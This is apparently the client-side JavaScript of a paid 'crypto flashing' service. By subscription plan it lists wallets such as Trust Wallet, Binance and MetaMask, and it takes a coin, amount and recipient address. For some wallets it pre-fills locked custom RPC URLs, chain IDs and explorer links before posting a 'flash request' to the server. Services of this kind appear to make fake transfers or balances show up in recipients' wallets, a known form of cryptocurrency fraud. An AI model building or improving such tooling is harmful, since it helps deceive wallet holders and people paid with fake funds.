// Flashing page functionality
document.addEventListener("DOMContentLoaded", () => {
  checkAuth()
  loadUserWallets()
})

function checkAuth() {
  const user = JSON.parse(localStorage.getItem("currentUser") || "{}")
  if (!user.username || !user.subscription) {
    window.location.href = "dashboard.html"
    return
  }

  // Check if subscription is still valid
  if (new Date(user.subscription.expiry) <= new Date()) {
    alert("Your subscription has expired. Please renew to continue flashing.")
    window.location.href = "dashboard.html"
    return
  }
}

function loadUserWallets() {
  const user = JSON.parse(localStorage.getItem("currentUser") || "{}")
  const subscription = user.subscription

  if (!subscription) {
    window.location.href = "dashboard.html"
    return
  }

  const walletGrid = document.getElementById("walletGrid")
  const wallets = getWalletsForPlan(subscription.plan)

  walletGrid.innerHTML = ""

  if (wallets.length === 0) {
    walletGrid.innerHTML = `
      <div style="grid-column: 1 / -1; text-align: center; padding: 3rem; color: #a1a1aa;">
        <i class="fas fa-wallet" style="font-size: 3rem; margin-bottom: 1rem; opacity: 0.5;"></i>
        <h3>No wallets available</h3>
        <p>Please check your subscription plan</p>
      </div>
    `
    return
  }

  // Load wallet availability and create cards
  fetch("/api/wallet-availability")
    .then((response) => response.json())
    .then((walletAvailability) => {
      wallets.forEach((wallet) => {
        const isWalletAvailable = walletAvailability[wallet.name] !== false
        const walletCard = createWalletCard(wallet, isWalletAvailable)
        walletGrid.appendChild(walletCard)
      })
    })
    .catch((error) => {
      console.error("Error loading wallet availability:", error)
      // Fallback: show all wallets as available
      wallets.forEach((wallet) => {
        const walletCard = createWalletCard(wallet, true)
        walletGrid.appendChild(walletCard)
      })
    })
}

function getWalletsForPlan(plan) {
  const walletPlans = {
    "1month": [
      {
        name: "Coinbase",
        image: "img/coinbase.png",
        className: "wallet-coinbase",
        tag: "ai",
      },
      {
        name: "Trust Wallet",
        image: "img/trustwallet.png",
        className: "wallet-trustwallet",
        tag: "ai",
        bulk: true,
      },
    ],
    "3months": [
      {
        name: "Coinbase",
        image: "img/coinbase.png",
        className: "wallet-coinbase",
        tag: "ai",
      },
      {
        name: "Trust Wallet",
        image: "img/trustwallet.png",
        className: "wallet-trustwallet",
        tag: "ai",
        bulk: true,
      },
      {
        name: "Atomic",
        image: "img/atomic.png",
        className: "wallet-atomic",
        tag: "ai",
      },
    ],
    "6months": [
      {
        name: "Trust Wallet",
        image: "img/trustwallet.png",
        className: "wallet-trustwallet",
        tag: "ai",
        bulk: true,
      },
      {
        name: "Coinbase",
        image: "img/coinbase.png",
        className: "wallet-coinbase",
        tag: "ai",
      },
      {
        name: "Atomic",
        image: "img/atomic.png",
        className: "wallet-atomic",
        tag: "ai",
      },
      {
        name: "Binance",
        image: "img/binance.png",
        className: "wallet-binance",
        tag: "hot",
        bulk: true,
      },
      {
        name: "OKX",
        image: "img/okx.png",
        className: "wallet-okx",
        tag: "ai",
      },
    ],
    "8months": [
      {
        name: "Trust Wallet",
        image: "img/trustwallet.png",
        className: "wallet-trustwallet",
        tag: "trending",
        bulk: true,
      },
      {
        name: "Coinbase",
        image: "img/coinbase.png",
        className: "wallet-coinbase",
        tag: "ai",
      },
      {
        name: "Atomic",
        image: "img/atomic.png",
        className: "wallet-atomic",
        tag: "ai",
      },
      {
        name: "Binance",
        image: "img/binance.png",
        className: "wallet-binance",
        tag: "hot",
        bulk: true,
      },
      {
        name: "OKX",
        image: "img/okx.png",
        className: "wallet-okx",
        tag: "ai",
      },
      {
        name: "Crypto.com",
        image: "img/crypto.png",
        className: "wallet-crypto",
        tag: "ai",
      },
      {
        name: "CoinEx",
        image: "img/coinex.png",
        className: "wallet-coinex",
        tag: "ai",
      },
      {
        name: "Blockchain",
        image: "img/blockchain.png",
        className: "wallet-blockchain",
        tag: "ai",
      },
      {
        name: "BTC",
        image: "img/btc.png",
        className: "wallet-btc",
        tag: "ai",
      },
      {
        name: "Exodus",
        image: "img/exodus.png",
        className: "wallet-exodus",
        tag: "ai",
      },
    ],
    "1year": [
      {
        name: "Trust Wallet",
        image: "img/trustwallet.png",
        className: "wallet-trustwallet",
        tag: "trending",
        bulk: true,
      },
      {
        name: "Coinbase",
        image: "img/coinbase.png",
        className: "wallet-coinbase",
        tag: "ai",
      },
      {
        name: "Atomic",
        image: "img/atomic.png",
        className: "wallet-atomic",
        tag: "ai",
      },
      {
        name: "Binance",
        image: "img/binance.png",
        className: "wallet-binance",
        tag: "hot",
        bulk: true,
      },
      {
        name: "OKX",
        image: "img/okx.png",
        className: "wallet-okx",
        tag: "ai",
      },
      {
        name: "Crypto.com",
        image: "img/crypto.png",
        className: "wallet-crypto",
        tag: "ai",
      },
      {
        name: "CoinEx",
        image: "img/coinex.png",
        className: "wallet-coinex",
        tag: "ai",
      },
      {
        name: "Blockchain",
        image: "img/blockchain.png",
        className: "wallet-blockchain",
        tag: "ai",
      },
      {
        name: "BTC",
        image: "img/btc.png",
        className: "wallet-btc",
        tag: "ai",
      },
      {
        name: "Exodus",
        image: "img/exodus.png",
        className: "wallet-exodus",
        tag: "ai",
      },
      {
        name: "SafePal",
        image: "img/safepal.png",
        className: "wallet-safepal",
        tag: "ai",
      },
      {
        name: "Token Pocket",
        image: "img/tokenpocket.png",
        className: "wallet-tokenpocket",
        tag: "ai",
      },
      {
        name: "MetaMask",
        image: "img/metamask.png",
        className: "wallet-metamask",
        tag: "new",
      },
    ],
  }

  return walletPlans[plan] || []
}

function createWalletCard(wallet, isAvailable) {
  const card = document.createElement("div")
  card.className = `wallet-card ${wallet.className}`

  // Add unavailable styling and disable click if wallet is not available
  if (!isAvailable) {
    card.classList.add("wallet-unavailable")
    card.style.opacity = "0.5"
    card.style.cursor = "not-allowed"
    card.style.filter = "grayscale(70%)"
  } else {
    card.onclick = () => openFlashModal(wallet)
    card.style.cursor = "pointer"
  }

  // Create tag element if wallet has a tag
  let tagHTML = ""
  if (wallet.tag) {
    const tagClass = `tag-${wallet.tag}`
    const tagText = wallet.tag.toUpperCase()
    tagHTML = `<div class="wallet-tag ${tagClass}">${tagText}</div>`
  }

  // Create bulk flashing button if wallet has bulk option
  let bulkHTML = ""
  if (wallet.bulk) {
    bulkHTML = `<div class="bulk-flashing">BULK FLASHING</div>`
  }

  // Add unavailable indicator if wallet is not available
  let unavailableHTML = ""
  if (!isAvailable) {
    unavailableHTML = `<div class="wallet-unavailable-indicator">UNAVAILABLE</div>`
  }

  card.innerHTML = `
        ${tagHTML}
        <div class="wallet-logo">
            <img src="${wallet.image}" alt="${wallet.name}" onerror="this.src='/placeholder.svg?height=60&width=60'">
        </div>
        <div class="wallet-name">${wallet.name}</div>
        ${bulkHTML}
        ${unavailableHTML}
    `

  return card
}

// Load wallet configurations when opening flash modal
function openFlashModal(wallet) {
  document.getElementById("flashTitle").textContent = `Flash via ${wallet.name}`

  // Set wallet image
  const walletImage = document.getElementById("selectedWalletImage")
  walletImage.src = wallet.image
  walletImage.alt = wallet.name

  // Show/hide form sections based on wallet type
  const standardForm = document.getElementById("standardFlashForm")
  const rpcForm = document.getElementById("rpcFlashForm")
  const extendedForm = document.getElementById("extendedFlashForm")

  // Hide all forms first
  standardForm.style.display = "none"
  rpcForm.style.display = "none"
  extendedForm.style.display = "none"

  // Show appropriate form based on wallet
  if (wallet.name === "Token Pocket" || wallet.name === "Crypto.com") {
    rpcForm.style.display = "block"
    loadCoinsForWallet(wallet.name, "rpcCoinSelect")

    // Load RPC URL from admin configuration
    loadWalletConfigurations(wallet.name)
  } else if (wallet.name === "MetaMask" || wallet.name === "Atomic") {
    extendedForm.style.display = "block"
    loadCoinsForWallet(wallet.name, "extendedCoinSelect")

    // Set up network selection change event
    const networkSelect = document.getElementById("extendedCoinSelect")
    networkSelect.addEventListener("change", function () {
      if (
        this.value === "BSC NETWORK" ||
        this.value === "TRX NETWORK" ||
        this.value === "BEP20 NETWORK" ||
        this.value === "ERC20 NETWORK"
      ) {
        loadNetworkConfiguration(wallet.name, this.value)
      }
    })
  } else {
    standardForm.style.display = "block"
    loadCoinsForWallet(wallet.name, "coinSelect")
  }

  document.getElementById("flashModal").style.display = "block"

  // Store selected wallet for form submission
  window.selectedWallet = wallet
}

// Load wallet configurations from server
function loadWalletConfigurations(walletName) {
  fetch("/api/wallet-configurations")
    .then((response) => response.json())
    .then((configs) => {
      if (walletName === "Token Pocket" && configs["Token Pocket"] && configs["Token Pocket"].rpcUrl) {
        document.getElementById("rpcUrl").value = configs["Token Pocket"].rpcUrl
        // Make the field readonly to prevent user modification
        document.getElementById("rpcUrl").setAttribute("readonly", "readonly")
      } else if (walletName === "Crypto.com" && configs["Crypto.com"] && configs["Crypto.com"].rpcUrl) {
        document.getElementById("rpcUrl").value = configs["Crypto.com"].rpcUrl
        // Make the field readonly to prevent user modification
        document.getElementById("rpcUrl").setAttribute("readonly", "readonly")
      }
    })
    .catch((error) => {
      console.error("Error loading wallet configurations:", error)
    })
}

// Load network configuration for MetaMask and Atomic
function loadNetworkConfiguration(walletName, networkName) {
  fetch("/api/wallet-configurations")
    .then((response) => response.json())
    .then((configs) => {
      if (configs[walletName] && configs[walletName].networks && configs[walletName].networks[networkName]) {
        const networkConfig = configs[walletName].networks[networkName]

        // Set form values
        document.getElementById("networkName").value = networkConfig.networkName || ""
        document.getElementById("extendedRpcUrl").value = networkConfig.rpcUrl || ""
        document.getElementById("chainId").value = networkConfig.chainId || ""
        document.getElementById("currencySymbol").value = networkConfig.currencySymbol || ""
        document.getElementById("blockExplorerUrl").value = networkConfig.blockExplorerUrl || ""

        // Make fields readonly to prevent user modification
        document.getElementById("networkName").setAttribute("readonly", "readonly")
        document.getElementById("extendedRpcUrl").setAttribute("readonly", "readonly")
        document.getElementById("chainId").setAttribute("readonly", "readonly")
        document.getElementById("currencySymbol").setAttribute("readonly", "readonly")
        document.getElementById("blockExplorerUrl").setAttribute("readonly", "readonly")
      }
    })
    .catch((error) => {
      console.error("Error loading network configurations:", error)
    })
}

function loadCoinsForWallet(walletName, targetSelectId = "coinSelect") {
  fetch("/api/wallet-coin-availability")
    .then((response) => response.json())
    .then((walletCoins) => {
      const coinSelect = document.getElementById(targetSelectId)
      const walletCoinData = walletCoins[walletName] || {}

      let defaultCoins = [
        "Bitcoin (BTC)",
        "Ethereum (ETH)",
        "USDT",
        "BNB",
        "USDC",
        "Dogecoin (DOGE)",
        "Cardano (ADA)",
        "Solana (SOL)",
      ]

      // Add extra coins for MetaMask and Atomic only
      if (walletName === "MetaMask" || walletName === "Atomic") {
        defaultCoins = [...defaultCoins, "BSC NETWORK", "TRX NETWORK", "BEP20 NETWORK", "ERC20 NETWORK"]
      }

      coinSelect.innerHTML = ""

      defaultCoins.forEach((coin) => {
        const option = document.createElement("option")
        option.value = coin

        const isAvailable = walletCoinData[coin] !== false
        if (isAvailable) {
          option.textContent = coin
        } else {
          option.textContent = `${coin} (Currently Unavailable)`
          option.disabled = true
          option.style.color = "#ef4444"
        }

        coinSelect.appendChild(option)
      })

      // Add change event listener to prevent selection of unavailable coins
      coinSelect.addEventListener("change", (e) => {
        const selectedCoin = e.target.value
        const isAvailable = walletCoinData[selectedCoin] !== false

        if (!isAvailable) {
          alert("Cannot select a coin that isn't available for this wallet")
          e.target.selectedIndex = 0
        }
      })
    })
    .catch((error) => {
      console.error("Error loading wallet coins:", error)
    })
}

function handleFlash(event) {
  event.preventDefault()

  const user = JSON.parse(localStorage.getItem("currentUser") || "{}")
  let selectedCoin, formData

  // Determine which form is active and get data accordingly
  if (window.selectedWallet.name === "Token Pocket" || window.selectedWallet.name === "Crypto.com") {
    // RPC Form
    selectedCoin = document.getElementById("rpcCoinSelect").value
    formData = {
      username: user.username,
      wallet: window.selectedWallet.name,
      coin: selectedCoin,
      quantity: document.getElementById("rpcQuantity").value,
      currency: document.getElementById("rpcCurrency").value,
      amount: document.getElementById("rpcAmount").value,
      walletAddress: document.getElementById("rpcWalletAddress").value,
      rpcUrl: document.getElementById("rpcUrl").value,
      flashType: document.getElementById("rpcFlashType").value,
      timestamp: new Date().toISOString(),
      flashId: generateFlashId(),
    }
  } else if (window.selectedWallet.name === "MetaMask" || window.selectedWallet.name === "Atomic") {
    // Extended Form
    selectedCoin = document.getElementById("extendedCoinSelect").value
    formData = {
      username: user.username,
      wallet: window.selectedWallet.name,
      coin: selectedCoin,
      quantity: document.getElementById("extendedQuantity").value,
      currency: document.getElementById("extendedCurrency").value,
      amount: document.getElementById("extendedAmount").value,
      walletAddress: document.getElementById("extendedWalletAddress").value,
      networkName: document.getElementById("networkName").value,
      rpcUrl: document.getElementById("extendedRpcUrl").value,
      chainId: document.getElementById("chainId").value,
      currencySymbol: document.getElementById("currencySymbol").value,
      blockExplorerUrl: document.getElementById("blockExplorerUrl").value,
      flashType: document.getElementById("extendedFlashType").value,
      timestamp: new Date().toISOString(),
      flashId: generateFlashId(),
    }
  } else {
    // Standard Form
    selectedCoin = document.getElementById("coinSelect").value
    formData = {
      username: user.username,
      wallet: window.selectedWallet.name,
      coin: selectedCoin,
      quantity: document.getElementById("quantity").value,
      currency: document.getElementById("currency").value,
      amount: document.getElementById("amount").value,
      walletAddress: document.getElementById("walletAddress").value,
      flashType: document.getElementById("flashType").value,
      timestamp: new Date().toISOString(),
      flashId: generateFlashId(),
    }
  }

  // Show initializing message
  showInitializingMessage()

  // Send flash request to server
  fetch("/api/flash-request", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(formData),
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.success) {
        hideInitializingMessage()
        showPendingMessage(formData.flashId, formData.walletAddress)
        document.getElementById("flashModal").style.display = "none"

        // Reset the appropriate form
        if (window.selectedWallet.name === "Token Pocket" || window.selectedWallet.name === "Crypto.com") {
          document.getElementById("rpcFlashForm").reset()
        } else if (window.selectedWallet.name === "MetaMask" || window.selectedWallet.name === "Atomic") {
          document.getElementById("extendedFlashForm").reset()
        } else {
          document.getElementById("flashForm").reset()
        }
      } else {
        hideInitializingMessage()
        alert("Error submitting flash request. Please try again.")
      }
    })
    .catch((error) => {
      console.error("Error:", error)
      hideInitializingMessage()
      alert("Error submitting flash request. Please try again.")
    })
}

function generateFlashId() {
  return "FLASH_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9)
}

function showInitializingMessage() {
  const initModal = document.createElement("div")
  initModal.id = "initializingModal"
  initModal.className = "modal"
  initModal.style.display = "block"
  initModal.innerHTML = `
        <div class="modal-content">
            <div style="text-align: center; padding: 2rem;">
                <div style="width: 60px; height: 60px; border: 4px solid #374151; border-top: 4px solid #2563eb; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 1rem;"></div>
                <h3 style="color: #2563eb; margin-bottom: 1rem;">Initializing</h3>
                <p style="color: #a1a1aa;">Flashing process is in progress...</p>
            </div>
        </div>
    `
  document.body.appendChild(initModal)
}

function hideInitializingMessage() {
  const initModal = document.getElementById("initializingModal")
  if (initModal) {
    document.body.removeChild(initModal)
  }
}

function showPendingMessage(flashId, walletAddress) {
  // Create pending modal
  const pendingModal = document.createElement("div")
  pendingModal.className = "modal"
  pendingModal.style.display = "block"
  pendingModal.innerHTML = `
        <div class="modal-content">
            <div style="text-align: center; padding: 2rem;">
                <div style="width: 80px; height: 80px; background: linear-gradient(45deg, #f59e0b, #d97706); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1rem; font-size: 2rem; color: white;">
                    <i class="fas fa-clock"></i>
                </div>
                <h3 style="color: #f59e0b; margin-bottom: 1rem;">Flash Request Pending</h3>
                <p style="color: #a1a1aa; margin-bottom: 0.5rem;">Flash ID: <strong style="color: #2563eb;">${flashId}</strong></p>
                <p style="color: #a1a1aa; margin-bottom: 1rem;">Flashing to:</p>
                <p style="color: #60a5fa; font-weight: 600; margin-bottom: 1rem; word-break: break-all;">${walletAddress}</p>
                <p style="color: #a1a1aa;">Please be patient, we will notify you when flashing has been completed</p>
                <button onclick="this.closest('.modal').remove()" class="btn btn-primary" style="margin-top: 1.5rem; padding: 10px 20px;">
                    <i class="fas fa-times"></i> Close
                </button>
            </div>
        </div>
    `

  document.body.appendChild(pendingModal)

  // Auto remove after 8 seconds
  setTimeout(() => {
    if (pendingModal.parentNode) {
      document.body.removeChild(pendingModal)
    }
  }, 8000)
}

function logout() {
  localStorage.removeItem("currentUser")
  window.location.href = "index.html"
}

// Close modal functionality
document.addEventListener("click", (event) => {
  if (event.target.classList.contains("modal")) {
    event.target.style.display = "none"
  }
})

document.querySelectorAll(".close").forEach((closeBtn) => {
  closeBtn.onclick = function () {
    this.closest(".modal").style.display = "none"
  }
})
